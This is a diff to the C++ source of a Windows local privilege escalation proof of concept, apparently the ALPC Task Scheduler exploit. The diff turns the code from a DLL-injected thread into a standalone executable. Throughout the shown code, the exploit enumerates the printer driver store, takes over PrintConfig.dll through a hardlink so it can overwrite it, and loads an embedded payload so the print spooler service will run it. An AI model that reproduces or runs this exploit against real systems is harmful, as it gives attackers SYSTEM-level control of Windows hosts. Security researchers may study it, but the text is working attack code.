@@ -31,9 +31,6 @@ This PoC will overwrite a printer related dll and use it as a hijacking vector. 
 #include <fstream>
 #pragma comment(lib, "rpcrt4.lib")
 
-
-#define DLL_MODULE_NAME L"ALPC-TaskSched-LPE"
-
 using namespace std;
 
 void start_print_job();
@@ -41,7 +38,6 @@ wstring get_windir();
 void* get_payload_from_resources(DWORD &payload_size);
 void try_open_dll_loop(wstring file_path, void *payload_binary, DWORD payload_size);
 wstring enumerate_printer_driver_path();
-wstring get_dll_module_name();
 bool create_native_hardlink(LPCWSTR linkname, LPCWSTR targetname);
 
 
@@ -112,7 +108,7 @@ void run_exploit()
 }
 
 
-int mainf()
+int main()
 {
 	//We enumerate the path of PrintConfig.dll, which we will write the DACL of and overwrite to hijack the print spooler service
 	//You might want to expand this code block with FindNextFile .. as there may be multiple prnms003.inf_amd64* folders since older versions do not get cleaned up it in some rare cases.
@@ -140,15 +136,10 @@ int mainf()
 
 void* get_payload_from_resources(DWORD &payload_size)
 {
-	//Must be name of final DLL.. might be better ways to grab the handle
-	HMODULE mod = GetModuleHandle(get_dll_module_name().c_str());
-
-	HRSRC myResource = ::FindResource(mod, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
-	payload_size = ::SizeofResource(mod, myResource);
-	HGLOBAL myResourceData = ::LoadResource(mod, myResource);
-	static void* pMyBinaryData = ::LockResource(myResourceData);
-
-	return pMyBinaryData;
+	HRSRC myResource = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
+	payload_size = SizeofResource(NULL, myResource);
+	static void *res_data = LoadResource(NULL, myResource);
+	return res_data;
 }
 
 
@@ -194,14 +185,6 @@ wstring get_windir()
 }
 
 
-DWORD CALLBACK ExploitThread(LPVOID hModule)
-{
-	mainf();
-	FreeLibraryAndExitThread((HMODULE)hModule, 0);
-	return 0;
-}
-
-
 //Enumerating the path of PrintConfig.dll, which we will write the DACL of and overwrite to hijack the print spooler service:
 wstring enumerate_printer_driver_path()
 {
@@ -215,11 +198,5 @@ wstring enumerate_printer_driver_path()
 	wstring printer_driver_folder = FindFileData.cFileName + end_path;
 	FindClose(hFind);
 
-	return windir + L"\\system32\\DriverStore\\FileRepository\\" + printer_driver_folder + end_path;
-}
-
-
-wstring get_dll_module_name()
-{
-	return DLL_MODULE_NAME;
+	return windir + L"\\system32\\DriverStore\\FileRepository\\" + printer_driver_folder;
 }
